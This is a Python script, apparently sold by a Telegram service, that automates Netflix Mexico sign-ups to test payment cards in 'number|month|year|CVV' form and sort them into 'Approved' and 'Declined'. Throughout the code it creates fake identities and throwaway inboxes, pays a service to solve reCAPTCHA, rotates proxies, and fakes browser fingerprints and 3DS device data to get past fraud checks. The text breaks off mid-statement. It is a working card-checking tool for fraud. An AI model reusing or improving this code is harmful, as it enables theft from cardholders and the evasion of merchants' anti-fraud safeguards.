'''
 * --------------------------------- [⚠️] README ------------------------------------
 *
 * Made By Vxsilisk © Sxgitario Gateway Api Service [ - https://t.me/Sxgitario - ]
 * Owner: @Vxsilisk
 *
 * Requirements: pip install curl-cffi faker colorama cryptography
 * Usage: r = processNetflixFlow(cardInput='CC|MM|YY|CSC', proxy='user:pass@host:port', capsolver_key='CAP-...')
 *
 * Gateway: Netflix Subscription MX (CLCS GraphQL + Cardinal 3DS + RSA-OAEP)
 *
 * Date: 24, April 2026 America/MexicoCity
 *
 * Thank you for choosing Sxgitario!
 * We're thrilled to power your projects with our APIs.
 * Can't wait to see you back soon — let's keep the magic coding! ✨
'''

import json, secrets, time, string, re, types, random, base64, threading
from faker import Faker
from curl_cffi import requests as curl
from colorama import Fore
from CSE.cseNetflixPayment import CseNetflixPayment
from mailx import GmailMailX

#//! ------------------------------------- Class Netflix ------------------------------------- !\\#

class Netflix:

    GRAPHQL_URL      = 'https://web.prod.cloud.netflix.com/graphql'
    REGFORM_URL      = 'https://www.netflix.com/mx/signup'
    CARDINAL_CRUISE  = 'https://client.cardinaltrusted.com/centinelapi/V2/Cruise/Collect'
    CARDINAL_RENDER  = 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render'
    CARDINAL_SAVE    = 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData'
    CARDINAL_NOTIFY  = 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Notification'
    CARDINAL_COLLECT = 'https://centinelapi.cardinalcommerce.com/V2/Cruise/CollectRedirect'
    NETFLIX_3DS_CB   = 'https://www.netflix.com/emvco3ds/dataCollection/callback'
    ORG_UNIT_ID      = '5c784c0001729d2bd87b09f6'

    SK_INIT     = '6LdqW_EqAAAAAO87Fb_kcZfNzs0IqJRcKiJDYpUv'
    SK_REGISTER = '6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp'
    SK_PAYMENT  = '6LcOdtsZAAAAAM6nliHfnrGYhvRBtuxIhaeFA6YC'

    PQ_INIT    = '6eb06f8d-ecc2-43aa-9fa3-af142d7d3d51'
    PQ_UPDATE  = 'bd7946db-f3e9-460d-94ca-132531a1960c'
    PQ_PRELOAD = '1fb261a9-f86c-4a97-a9bf-2e359f2b5367'

    PLAN_ID     = '5200'
    LOCALE      = 'es-MX'

    EMAIL_DOMAINS = ('gmail.com', 'outlook.com', 'hotmail.com')

    _mx = GmailMailX()   # Gmail IMAP catch-all — shopsxgitario.com / sxgitarioshop.com

    _hex = staticmethod(lambda n: ''.join(secrets.choice('0123456789abcdef') for _ in range(n)))

    @staticmethod
    def uuid() -> str:
        h = Netflix._hex(32)
        return f'{h[:8]}-{h[8:12]}-4{h[13:16]}-{random.choice("89ab")}{h[17:20]}-{h[20:]}'

    @staticmethod
    def parseCard(rawCard: str) -> dict:
        n, m, y, c = re.split(r'\s*[|/]\s*|\s+', rawCard.strip())[:4]
        y = f'20{y}' if len(y) == 2 else y
        return {'number': n, 'month': m.zfill(2), 'year': y, 'cvv': c}

    @staticmethod
    def generateProfile(mail: str | None = None) -> types.SimpleNamespace:
        fake, p = Faker('en_US'), Faker('en_US').profile()
        fn, ln  = p['name'].split()[0], p['name'].split()[-1]
        pwd = ''.join(secrets.choice(string.ascii_uppercase) for _ in range(2)) + ''.join(secrets.choice(string.ascii_lowercase) for _ in range(4)) + ''.join(secrets.choice(string.digits) for _ in range(3)) + '@'
        addr = mail or f'{fn.lower()}{random.choice("._-")}{ln.lower()}{random.randint(0,999)}@{random.choice(Netflix.EMAIL_DOMAINS)}'
        return types.SimpleNamespace(fn=fn, ln=ln, password=pwd, mail=addr)


    @staticmethod
    def solveRecaptcha(cap_key: str, sitekey: str, proxy: str | None = None, label: str = '') -> str | None:
        # Always ProxyLess — Netflix validates token server-side, solving IP is irrelevant
        task = {'type': 'ReCaptchaV3EnterpriseTaskProxyLess', 'websiteURL': 'https://www.netflix.com/', 'websiteKey': sitekey, 'pageAction': 'signup_submit'}
        try:
            r = curl.post('https://api.capsolver.com/createTask', json = {'clientKey': cap_key, 'task': task}, timeout = 20).json()
            if r.get('errorId', 1) != 0:
                print(f'    [CAP{label}] createTask error: {r.get("errorCode","?")} {r.get("errorDescription","?")}')
                return None
            tid = r['taskId']
            for _ in range(60):
                time.sleep(3)
                r2 = curl.post('https://api.capsolver.com/getTaskResult', json = {'clientKey': cap_key, 'taskId': tid}, timeout = 15).json()
                if r2.get('status') == 'ready': return r2['solution']['gRecaptchaResponse']
                if r2.get('errorId', 0) != 0:
                    print(f'    [CAP{label}] getTaskResult error: {r2.get("errorCode","?")}')
                    return None
        except Exception as _e:
            print(f'    [CAP{label}] exception: {_e}')
            return None
        print(f'    [CAP{label}] timeout (60 polls)')
        return None

    @staticmethod
    def field(name: str, value) -> dict:
        if value is None: return {'name': name, 'value': {}}
        if isinstance(value, bool): return {'name': name, 'value': {'booleanValue': value}}
        if isinstance(value, int): return {'name': name, 'value': {'intValue': value}}
        return {'name': name, 'value': {'stringValue': str(value)}}

    @staticmethod
    def findSSUs(obj, depth: int = 0) -> list:
        found = []
        if depth > 12: return found
        if isinstance(obj, dict):
            ssu = obj.get('serverScreenUpdate')
            if ssu and isinstance(ssu, str):
                try: found.append((json.loads(ssu).get('name', '?'), ssu))
                except: found.append((f'bin_{len(found)}', ssu))  # binary SSU — keep it
            for v in obj.values(): found.extend(Netflix.findSSUs(v, depth + 1))
        elif isinstance(obj, list):
            for v in obj: found.extend(Netflix.findSSUs(v, depth + 1))
        return found

    @staticmethod
    def findVal(obj, key: str, depth: int = 0):
        if depth > 12: return None
        if isinstance(obj, dict):
            if key in obj and obj[key] is not None: return obj[key]
            for v in obj.values():
                r = Netflix.findVal(v, key, depth + 1)
                if r is not None: return r
        elif isinstance(obj, list):
            for v in obj:
                r = Netflix.findVal(v, key, depth + 1)
                if r is not None: return r
        return None

    @staticmethod
    def buildBrowserData() -> str:
        return json.dumps({'BrowserHeader': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'IPAddress': '127.0.0.1', 'BrowserJavaEnabled': False, 'BrowserLanguage': 'es-MX', 'BrowserColorDepth': 30, 'BrowserScreenHeight': 1050, 'BrowserScreenWidth': 1680, 'BrowserTimeZone': 360, 'UserAgent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0', 'DeviceChannel': 'Browser', 'BrowserJavascriptEnabled': True}, separators=(',', ':'))

    @staticmethod
    def doCardinal(session, card: dict, cardinal_init_jwt: str | None) -> str | None:
        if not cardinal_init_jwt: return None
        bin8, nonce = card['number'][:8], Netflix.uuid()
        try:
            headers10 = {'content-type': 'application/x-www-form-urlencoded'}
            payload10 = f'Bin={bin8}&JWT={cardinal_init_jwt}'
            request10 = session.post(url = Netflix.CARDINAL_CRUISE, data = payload10, headers = headers10, timeout = 15)
        except Exception: return None
        m = re.search(r'<input[^>]+id=["\']referenceId["\'][^>]+value=["\']([^"\']+)["\']', request10.text) or re.search(r'<input[^>]+id=["\']mcsId["\'][^>]+value=["\']([^"\']+)["\']', request10.text)
        if not m: return None
        mcs_id = m.group(1)
        m_df   = re.search(r'id=["\']dfUrlFullValue["\'][^>]+value=["\']([^"\']+)["\']', request10.text)
        df_url = m_df.group(1).replace('&amp;', '&') if m_df else f'{Netflix.CARDINAL_RENDER}?referenceId={mcs_id}&orgUnitId={Netflix.ORG_UNIT_ID}&threatmetrix=true&tmEventType=PAYMENT&geolocation=false&alias=Default&origin=CruiseAPI'
        try:
            headers11 = {'content-type': 'application/x-www-form-urlencoded'}
            payload11 = f'bin={bin8}&nonce={nonce}'
            request11 = session.post(url = df_url, data = payload11, headers = headers11, timeout = 15)
        except Exception: return None
        m        = re.search(r'"ThreeDSServerTransactionId"\s*:\s*"([^"]+)"', request11.text)
        trans_id = m.group(1) if m else None
        if not trans_id: return None
        m2             = re.search(r'"Payload"\s*:\s*"([^"]+)"', request11.text)
        m3             = re.search(r'"MethodURL"\s*:\s*"([^"]+)"', request11.text)
        method_payload = m2.group(1) if m2 else None
        method_url     = m3.group(1) if m3 else None
        headers12 = {'content-type': 'application/json'}
        payload12 = {'Cookies': {'Legacy': True, 'LocalStorage': True, 'SessionStorage': True}, 'DeviceChannel': 'Browser', 'Extended': {'Browser': {'Adblock': False, 'AvailableJsFonts': ['Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia', 'Helvetica Neue', 'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana'], 'DoNotTrack': 'unspecified', 'JavaEnabled': False}, 'Device': {'ColorDepth': 30, 'Cpu': 'unknown', 'Platform': 'MacIntel', 'TouchSupport': {'MaxTouchPoints': 0, 'OnTouchStartAvailable': False, 'TouchEventCreationSuccessful': False}}}, 'Fingerprint': Netflix._hex(32), 'FingerprintingTime': random.randint(80, 200), 'FingerprintDetails': {'Version': '1.5.1'}, 'Language': 'es-ES', 'Latitude': None, 'Longitude': None, 'OrgUnitId': Netflix.ORG_UNIT_ID, 'Origin': 'CruiseAPI', 'Plugins': ['PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf'], 'ReferenceId': mcs_id, 'Referrer': 'https://client.cardinaltrusted.com/', 'Screen': {'FakedResolution': False, 'Ratio': 1.6, 'Resolution': '1680x1050', 'UsableResolution': '1680x955', 'CCAScreenSize': '01'}, 'CallSignEnabled': None, 'ThreatMetrixEnabled': False, 'ThreatMetrixEventType': 'PAYMENT', 'ThreatMetrixAlias': 'Default', 'TimeOffset': 360, 'UserAgent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0', 'UserAgentDetails': {'FakedOS': False, 'FakedBrowser': False}, 'VcdiClientRequestId': Netflix.uuid(), 'BinSessionId': nonce}
        try: session.post(url = Netflix.CARDINAL_SAVE, json = payload12, headers = headers12, timeout = 15)
        except: pass
        if method_payload and method_url:
            try: session.post(url = method_url, data = f'threeDSMethodData={method_payload}', headers = {'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://client.cardinaltrusted.com/'}, timeout = 15)
            except: pass
        three_ds_method_data = base64.b64encode(json.dumps({'threeDSServerTransID': trans_id}, separators=(',', ':')).encode()).decode()
        try: session.post(url = Netflix.CARDINAL_NOTIFY, params = {'binSessionId': trans_id, 'referenceId': mcs_id, 'orgUnitId': Netflix.ORG_UNIT_ID}, data = f'threeDSMethodData={three_ds_method_data}', headers = {'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://methodurl.vcas.visa.com', 'referer': 'https://methodurl.vcas.visa.com/', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'sec-fetch-dest': 'iframe', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site'}, timeout = 15)
        except: pass
        time.sleep(1)
        payload15 = {'McsId': mcs_id, 'DataSources': json.dumps({'CardinalData': {'Attempted': True, 'Completed': True}, 'MethodUrl': {'Attempted': True, 'Completed': True}}), 'ActionCode': 'SUCCESS', 'Error': ''}
        try:
            request15 = session.post(url = Netflix.CARDINAL_COLLECT, data = payload15, headers = {'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/'}, timeout = 15)
        except: return None
        m = re.search(r'<input[^>]+name=["\']Response["\'][^>]+value=["\']([^"\']+)["\']', request15.text) or re.search(r'value=["\']([^"\']+)["\'][^>]+name=["\']Response["\']', request15.text)
        if not m: return None
        response_jwt = m.group(1)
        try: session.post(url = Netflix.NETFLIX_3DS_CB, data = f'Response={response_jwt}', headers = {'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/'}, timeout = 15)
        except: pass
        return response_jwt

    @staticmethod
    def _extractDeclineText(screen: dict) -> str:
        ct = screen.get('componentTree', {})
        def _find_alert(obj, depth=0):
            if depth > 12: return None
            if isinstance(obj, dict):
                if obj.get('__typename') == 'CLCSAlert' and obj.get('type') == 'WARNING': return (obj.get('content') or {}).get('key')
                for v in obj.values():
                    r = _find_alert(v, depth + 1)
                    if r: return r
            elif isinstance(obj, list):
                for v in obj:
                    r = _find_alert(v, depth + 1)
                    if r: return r
            return None
        def _find_text(obj, key, depth=0):
            if depth > 12: return None
            if isinstance(obj, dict):
                if obj.get('key') == key and obj.get('__typename') == 'CLCSText':
                    pc = obj.get('plainContent')
                    return (pc.get('value', '') if isinstance(pc, dict) else '') or ''
                for v in obj.values():
                    r = _find_text(v, key, depth + 1)
                    if r: return r
            elif isinstance(obj, list):
                for v in obj:
                    r = _find_text(v, key, depth + 1)
                    if r: return r
            return None
        def _find_short(obj, depth=0):
            if depth > 10: return None
            if isinstance(obj, dict):
                if obj.get('__typename') == 'CLCSText':
                    pc  = obj.get('plainContent')
                    val = (pc.get('value', '') if isinstance(pc, dict) else '') or ''
                    if 5 < len(val) < 200: return val[:150]
                for v in obj.values():
                    r = _find_short(v, depth + 1)
                    if r: return r
            elif isinstance(obj, list):
                for v in obj:
                    r = _find_short(v, depth + 1)
                    if r: return r
            return None
        alert_key = _find_alert(ct)
        if alert_key:
            text = _find_text(ct, alert_key)
            if text and len(text) > 5: return text[:150]
        return _find_short(ct) or 'Declined'

    #//! Decline screens — CLCSScreenUpdateTransition + SUCCESS doesn't mean Approved
    _DECLINE_LVN = {'ENTER_CARD', 'changeCardProcessingType', 'PAYMENT_PICKER', 'ENTER_PAYMENT', 'PAYMENT_METHOD_ERROR', 'otpPhoneEntry'}

    @staticmethod
    def buildBillingResponse(card: dict, resp: dict, data: types.SimpleNamespace) -> dict:
        card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        try:
            result  = resp.get('data', {}).get('result') or {}
            outcome = result.get('outcomeType', '')
            status  = result.get('status', '')
            screen  = result.get('screen') or {}
            lvn     = screen.get('loggingViewName', '') or ''
            errors  = Netflix.findVal(resp, 'errors')
        except Exception: return {'status': True, 'success': False, 'card': card_str, 'response': 'ParseError', 'apiResponse': 'Unknown ⚠️', 'email': data.mail, 'password': data.password}

        if errors:
            code = errors[0].get('code', 'unknown') if isinstance(errors, list) else str(errors)
            return {'status': True, 'success': False, 'card': card_str, 'response': code, 'apiResponse': 'Declined ❌', 'email': data.mail, 'password': data.password}

        #//? CLCSScreenUpdateTransition: check LVN before declaring Approved
        if outcome == 'CLCSScreenUpdateTransition' and status == 'SUCCESS':
            if lvn in Netflix._DECLINE_LVN:
                return {'status': True, 'success': False, 'card': card_str, 'response': Netflix._extractDeclineText(screen), 'apiResponse': 'Declined ❌', 'email': data.mail, 'password': data.password}
            return {'status': True, 'success': True, 'card': card_str, 'response': 'Approved', 'apiResponse': 'Approved ✅', 'email': data.mail, 'password': data.password}

        #//? Catch-all decline by LVN even if outcome differs
        if lvn in Netflix._DECLINE_LVN:
            return {'status': True, 'success': False, 'card': card_str, 'response': Netflix._extractDeclineText(screen), 'apiResponse': 'Declined ❌', 'email': data.mail, 'password': data.password}

        #//? Poll exhausted / effect still pending
        if outcome == 'CLCSScreenUpdateEffect':
            alert_msg = ''
            try:
                for node in result.get('effect', {}).get('nodes', []):
                    _msg      = node['errorHandling']['alert']['message']
                    alert_msg = (_msg.get('plainContent') or {}).get('value') or _msg.get('value') or ''
                    if alert_msg: break
            except: pass
            return {'status': True, 'success': False, 'card': card_str, 'response': alert_msg or 'CLCSScreenUpdateEffect', 'apiResponse': 'Unknown ⚠️', 'email': data.mail, 'password': data.password}

        return {'status': True, 'success': False, 'card': card_str, 'response': str(lvn or status or outcome or 'Unknown'), 'apiResponse': 'Unknown ⚠️', 'email': data.mail, 'password': data.password}




#//! ------------------------------------- Process ------------------------------------- !\\#

def processNetflixFlow(cardInput: str, proxy=None, capsolver_key: str = '', retries: int = 0) -> dict:

    # Support proxy list for rotation: use a different session per retry
    _proxy_list = proxy if isinstance(proxy, list) else ([proxy] if proxy else [None])
    _cur_proxy  = _proxy_list[retries % len(_proxy_list)]

    model = curl.Session(impersonate = 'chrome131') #//? Make a Cookie Session!
    card  = Netflix.parseCard(cardInput)             #//? Parse a card into text var!
    model.proxies = {'http': f'http://{_cur_proxy}', 'https': f'http://{_cur_proxy}'} if _cur_proxy else None

    try:

        #//! Create inbox on own domain via MailX → Netflix won't recognize it as disposable
        tm_email = Netflix._mx.create()
        data     = Netflix.generateProfile(mail=tm_email)
        print(f'[1] Email creado: {tm_email}  proxy={(_cur_proxy or "none").split("@")[-1][:30]}')

        #//! Pre-solve reCAPTCHAs in background:
        #   cap0 = SK_INIT    → CLCSWebInitSignup retry when identification path detected
        #   cap1 = SK_REGISTER → email submit on identification path
        #   cap2 = SK_PAYMENT  → card charge step
        _cap0_box = [None]; _cap1_box = [None]; _cap2_box = [None]
        def _solve_cap0(): _cap0_box[0] = Netflix.solveRecaptcha(capsolver_key, Netflix.SK_INIT,     label='0-INIT')
        def _solve_cap1(): _cap1_box[0] = Netflix.solveRecaptcha(capsolver_key, Netflix.SK_REGISTER, label='1-REG')
        def _solve_cap2(): _cap2_box[0] = Netflix.solveRecaptcha(capsolver_key, Netflix.SK_PAYMENT,  label='2-PAY')
        _cap0_thread = threading.Thread(target=_solve_cap0, daemon=True)
        _cap1_thread = threading.Thread(target=_solve_cap1, daemon=True)
        _cap2_thread = threading.Thread(target=_solve_cap2, daemon=True)
        _cap0_thread.start(); _cap1_thread.start(); _cap2_thread.start()
        print(f'[1b] reCAPTCHA cap0+cap1+cap2 pre-solving en background...')

        #//! Request 1: Init Cookie Session
        headers1 = {'accept': 'text/html,application/xhtml+xml,*/*;q=0.9', 'accept-language': 'es-ES,es;q=0.9', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0'}
        model.get(url = Netflix.REGFORM_URL, headers = headers1)
        flwssn   = Netflix.uuid()
        print(f'[2] Cookie session iniciada')

        #//! Request 3: CLCSWebInitSignup — flwssn + email
        import json as _json
        headers3 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': 'https://www.netflix.com/', 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSWebInitSignup'}
        payload3 = {'operationName': 'CLCSWebInitSignup', 'variables': {'inputNode': 'WELCOME', 'locale': Netflix.LOCALE, 'inputFields': [
            Netflix.field('flwssn', flwssn),
            Netflix.field('email', tm_email),
        ]}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_INIT}}}
        request3 = model.post(url = Netflix.GRAPHQL_URL, headers = headers3, json = payload3).json()
        init_data = request3.get('data', {}).get('clcsWebInitSignup')
        if not init_data:
            errs = request3.get('errors', [])
            raise Exception(f'CLCSWebInitSignup: {errs[0].get("extensions", {}).get("errorDetail", "null") if errs else "null"}')
        init_screen  = init_data['screen']
        ss           = init_screen['serverState']
        init_lvn     = init_screen.get('loggingViewName', '') or Netflix.findVal(request3, 'loggingViewName') or ''
        print(f'[4] CLCSWebInitSignup OK  LVN={init_lvn}  SSUs={len(Netflix.findSSUs(request3))}')

        #//! Request 4b: CLCSScreenUpdate → submit email
        ssus3    = Netflix.findSSUs(request3)
        reg_ssu  = ssus3[0][1] if ssus3 else None
        if not reg_ssu: raise Exception('No SSU in CLCSWebInitSignup response')
        headers4 = {'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.netflix.com', 'referer': Netflix.REGFORM_URL, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.clcs.bucket': 'high', 'x-netflix.request.toplevel.uuid': Netflix.uuid(), 'x-netflix.context.ui-flavor': 'akira', 'x-netflix.request.originating.url': Netflix.REGFORM_URL, 'x-netflix.context.app-version': 'vd7c38588', 'x-netflix.context.locales': 'es-mx', 'x-netflix.request.attempt': '1', 'x-netflix.request.client.context': '{"appstate":"foreground"}', 'x-netflix.context.operation-name': 'CLCSScreenUpdate'}
        if 'identification' in init_lvn:
            _cap0_thread.join(timeout=30)
            _cap1_thread.join(timeout=30)
            cap0 = _cap0_box[0] or 'dummy'
            cap1 = _cap1_box[0] or 'dummy'
            _LOGIN_URL = 'https://www.netflix.com/mx/login'
            print(f'[4b] identification — cap0={bool(_cap0_box[0])} cap1={bool(_cap1_box[0])}')
            headers4 = {**headers4,
                'referer': _LOGIN_URL,
                'x-netflix.request.originating.url': _LOGIN_URL,
            }
            input_fields4 = [
                Netflix.field('userLoginId', tm_email),
                Netflix.field('countryCode',   'MX'),
                Netflix.field('countryIsoCode', 'MX'),
                Netflix.field('recaptchaResponseToken', cap1),
            ]
        else:
            cap1 = 'dummy'
            input_fields4 = [Netflix.field('email', tm_email), Netflix.field('pipcConsent', False)]
        payload4  = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss, 'serverScreenUpdate': reg_ssu, 'inputFields': input_fields4}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
        request4  = model.post(url = Netflix.GRAPHQL_URL, headers = headers4, json = payload4).json()
        r4_lvn    = Netflix.findVal(request4, 'loggingViewName') or '?'
        r4_outcome = (request4.get('data', {}) or {}).get('result', {})
        r4_outcome = (r4_outcome or {}).get('outcomeType', '?') if isinstance(r4_outcome, dict) else '?'
        ssus4     = Netflix.findSSUs(request4)
        print(f'[6] CLCSScreenUpdate (email submit)  LVN={r4_lvn}  outcome={r4_outcome}  SSUs={len(ssus4)}')
        r4_result = (request4.get('data', {}) or {}).get('result') or {}
        r4_screen  = r4_result.get('screen') or {}
        r4_effect  = r4_result.get('effect') or {}
        r4_errors  = request4.get('errors')
        if r4_errors: print(f'    ERRORS: {r4_errors}')
        def _find_texts(obj, depth=0):
            texts = []
            if depth > 8: return texts
            if isinstance(obj, dict):
                pc = obj.get('plainContent')
                if isinstance(pc, dict) and pc.get('value'): texts.append(pc['value'][:120])
                for v in obj.values(): texts.extend(_find_texts(v, depth+1))
            elif isinstance(obj, list):
                for v in obj: texts.extend(_find_texts(v, depth+1))
            return texts
        texts = _find_texts(r4_screen)
        if texts: print(f'    texts: {texts[:3]}')

        #//! Auto-follow / second submit — identification flow needs the email submitted again with the new SSU
        ss4           = ((request4.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(request4, 'serverState') or ss
        headers4b     = {**headers4, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.toplevel.uuid': Netflix.uuid()}
        r4b           = {}
        r4b_lvn       = '?'
        r4b_ssus      = []
        # emailRegisterLinkSent — link ya enviado en step [6], skip follow
        if 'LinkSent' in r4_lvn or 'linkSent' in r4_lvn:
            r4b      = request4
            r4b_lvn  = r4_lvn
            r4b_ssus = ssus4
            print(f'[7] Link ya enviado en step [6] ({r4_lvn}) — skip follow')
        elif ssus4:
            follow_ssu    = ssus4[0][1]
            follow_inputs = []
            if 'identification' in r4_lvn:
                follow_inputs = [Netflix.field('userLoginId', tm_email), Netflix.field('countryCode', 'MX'), Netflix.field('countryIsoCode', 'MX')]
            elif 'emailRegister' in r4_lvn:
                follow_inputs = [Netflix.field('email', tm_email)]
            print(f'[7] Sending follow: ssu_len={len(follow_ssu)}  ss4_type={type(ss4).__name__}  inputs={[f["name"] for f in follow_inputs]}')
            payload4b = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': ss4, 'serverScreenUpdate': follow_ssu, 'inputFields': follow_inputs}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
            r4b = model.post(url = Netflix.GRAPHQL_URL, headers = headers4b, json = payload4b).json()
            r4b_outcome = ((r4b.get('data', {}) or {}).get('result') or {}).get('outcomeType', '?')
            r4b_lvn     = Netflix.findVal(r4b, 'loggingViewName') or '?'
            r4b_errors  = r4b.get('errors')
            r4b_ssus    = Netflix.findSSUs(r4b)
            print(f'[7] Follow SSU  outcome={r4b_outcome}  LVN={r4b_lvn}  SSUs={len(r4b_ssus)}')
            if r4b_errors: print(f'    ERRORS: {r4b_errors}')
            r4b_texts = _find_texts((r4b.get('data', {}) or {}).get('result') or {})
            if r4b_texts: print(f'    texts: {r4b_texts[:3]}')
            # Retry loop: on first attempt use empty inputs (let server auto-advance after
            # receiving reCAPTCHA in step [6]), then fall back to re-submitting email fields.
            _r4_cur = r4b
            if 'identification' in r4b_lvn and r4b_ssus:
                for _retry_7b in range(5):
                    _ssus_cur = Netflix.findSSUs(_r4_cur)
                    if not _ssus_cur: break
                    _ss_cur   = (((_r4_cur.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(_r4_cur, 'serverState') or ss4)
                    time.sleep(1)
                    headers4c = {**headers4, 'x-netflix.request.id': Netflix._hex(32), 'x-netflix.request.toplevel.uuid': Netflix.uuid()}
                    if _retry_7b < 2:
                        _retry_inputs = [Netflix.field('userLoginId', tm_email), Netflix.field('countryCode', 'MX'), Netflix.field('countryIsoCode', 'MX')]
                    else:
                        _retry_inputs = [Netflix.field('countryCode', 'MX'), Netflix.field('countryIsoCode', 'MX')]
                    payload4c = {'operationName': 'CLCSScreenUpdate', 'variables': {'format': 'HTML', 'imageFormat': 'PNG', 'locale': Netflix.LOCALE, 'serverState': _ss_cur, 'serverScreenUpdate': _ssus_cur[0][1], 'inputFields': _retry_inputs}, 'extensions': {'persistedQuery': {'version': 102, 'id': Netflix.PQ_UPDATE}}}
                    r4c       = model.post(url=Netflix.GRAPHQL_URL, headers=headers4c, json=payload4c).json()
                    r4c_lvn   = Netflix.findVal(r4c, 'loggingViewName') or '?'
                    r4c_ssus  = Netflix.findSSUs(r4c)
                    r4c_texts = _find_texts((r4c.get('data', {}) or {}).get('result') or {})
                    print(f'[7b] Retry#{_retry_7b+1}(inputs={len(_retry_inputs)})  LVN={r4c_lvn}  SSUs={len(r4c_ssus)}')
                    if r4c_texts: print(f'    texts: {r4c_texts[:3]}')
                    if r4c.get('errors'): print(f'    ERR: {r4c["errors"][0].get("extensions",{}).get("errorDetail","?")}')
                    if 'authenticationLinkSent' in r4c_lvn:
                        r4b      = r4c
                        r4b_lvn  = r4c_lvn
                        r4b_ssus = r4c_ssus
                        break
                    if 'identification' not in r4c_lvn and r4c_lvn != '?':
                        r4b      = r4c
                        r4b_lvn  = r4c_lvn
                        r4b_ssus = r4c_ssus
                        break
                    _r4_cur = r4c
        else:
            print(f'[7] No SSUs en respuesta — saltando auto-follow')

        #//! Save auth SSU and serverState from authenticationLinkSent for post-link polling
        # Fail fast: if still on emailRegisterSendLink after follow, Netflix won't send the email
        if r4b_lvn.strip() == 'emailRegisterSendLink':
            raise Exception('Email link NOT sent (emailRegisterSendLink persists) — Netflix blocked this email/proxy')
        ss_auth   = ((r4b.get('data', {}).get('result') or {}).get('screen') or {}).get('serverState') or Netflix.findVal(r4b, 'serverState') or ss4
        auth_poll_ssu = None
        if ('authenticationLinkSent' in r4b_lvn or 'LinkSent' in r4b_lvn) and r4b_ssus:
            _r4b_eff = ((r4b.get('data', {}) or {}).get('result') or {}).get('effect') or {}
            if _r4b_eff.get('__typename') == 'CLCSPollForScreenUpdate':
                _poll_nodes = _r4b_eff.get('nodes', [])
                auth_poll_ssu = next((n.get('serverScreenUpdate') for n in _poll_nodes if n.get('serverScreenUpdate')), None)
            if not auth_poll_ssu:
                auth_poll_ssu = r4b_ssus[0][1]  # first regular SSU

        #//! Verify email: poll mailx inbox → extract Netflix magic link → follow with session
        print(f'[8] Polling email en {tm_email}...')
        _magic_pats = ['/epr?', 'loginToken', '/mx/login?', 'signinFlow', 'Token=', '/signup?token']
        links_found, email_body = Netflix._mx.poll(tm_email, timeout=60, interval=2, filter_domain='netflix', magic_patterns=_magic_pats)
        nf_links = [l for l in links_found if 'www.netflix.com' in l]
        # Find the magic authentication link — /epr?code= is Netflix's EPR (email pre-registration) auth endpoint
        _skip = ('/notificationsettings', '/help', '/legal', '/contactus', '/browse', '/YourAccount', '/TermsOfUse', '/PrivacyPolicy', 'netflix.com=', 'netflix.com/brows=')
        # Priority 1: /epr?code= — the actual magic authentication link
        magic_link = next((l for l in nf_links if '/epr?' in l and 'code=' in l and '3D' not in l.split('code=')[1][:4]), None)
        # Priority 2: loginToken or signinFlow
        if not magic_link:
            magic_link = next((l for l in nf_links if any(k in l for k in ('loginToken', 'signinFlow', 'Token=')) and not any(s in l for s in _skip)), None)
        # Priority 3: first non-utility link
        if not magic_link:
            magic_link = next((l for l in nf_links if not any(s in l for s in _skip)), None)
        print(f'[8] Magic link: {(magic_link or "NOT FOUND")[:120]}')
        _epr_body = ''
        verified = False
        if magic_link:
            try:
                r_lnk = model.get(url=magic_link, headers={'accept': 'text/html,*/*', 'accept-language': 'es-ES,es;q=0.9', 'referer': 'https://mail.google.com/'}, timeout=20, allow_redirects=True)
                print(f'[8] Seguido: {r_lnk.url}  status={r_lnk.status_code}')
                _epr_body = r_lnk.text
                model.get(url='https://www.netflix.com/mx/', headers=headers1, timeout=15)
                Netflix._mx.delete(tm_email)
                verified = True
            except Exception as e:
